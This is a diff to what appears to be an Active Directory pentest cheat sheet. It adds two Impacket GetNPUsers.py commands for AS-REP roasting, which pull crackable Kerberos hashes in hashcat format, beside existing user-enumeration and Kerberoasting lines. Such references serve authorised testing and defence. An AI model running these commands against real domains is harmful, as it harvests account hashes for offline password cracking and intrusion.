@@ -335,6 +335,8 @@ GetNPUsers.py <DOMAIN>/ -usersfile user.list -format hashcat -output hashes.txt
 
 Retrieving information from kerberos
 GetADUsers.py -all <domain>/<username> -dc-ip <ipaddr>
+GetNPUsers.py -dc-ip <IP> -request 'domain.local/'
+GetNPUsers.py -dc-ip <IP> -request 'domain.local/' -format hashcat
 
 Retrieving a ticket from kerberos
 GetUserSPNs.py <domain>/<username> -dc-ip <ipaddr> -request
